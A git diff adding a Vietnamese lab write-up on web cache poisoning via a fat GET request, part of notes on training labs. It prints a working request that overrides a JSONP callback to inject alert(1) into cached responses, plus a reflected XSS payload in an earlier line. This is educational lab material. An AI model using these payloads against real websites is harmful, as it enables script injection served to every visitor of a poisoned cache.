@@ -104,6 +104,28 @@ Gửi request `/?utm_content=b'><script>alert(1)</script>` đến khi response �
 # 7. Parameter cloaking
 
 # 8. Web cache poisoning via a fat GET request
+Trong home page của website có thẻ script 
+```
+<script type="text/javascript" src="/js/geolocate.js?callback=setCountryCookie">
+```
+Truy cập `/js/geolocate.js?callback=setCountryCookie` ta được response như sau
+```
+const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+setCountryCookie({"country":"United Kingdom"});
+```
+Nhận thấy khi thay đổi query parameter `callback=abc` thì dòng cuối cùng cũng thay đổi thành `abc({"country":"United Kingdom"});`. Như vậy với `callback=alert(1);` thì sẽ có lỗi XSS xảy ra.
+
+Ta cấu hình một "fat" GET request như sau:
+```
+GET /js/geolocate.js?callback=setCountryCoookie
+Host: 0a7c00bb049def96c066409d00210084.web-security-academy.net
+X-HTTP-Method-Override: POST
+....
+
+callback=alert(1);
+```
+Nhận thấy cache vẫn trả về trạng thái hit. Đợi đến khi cache hết hạn rồi submit, ta thấy `alert(1);` đã xuất hiện trong response. Kết quả bài lab được giải.
 
 # 9. URL normalization
 
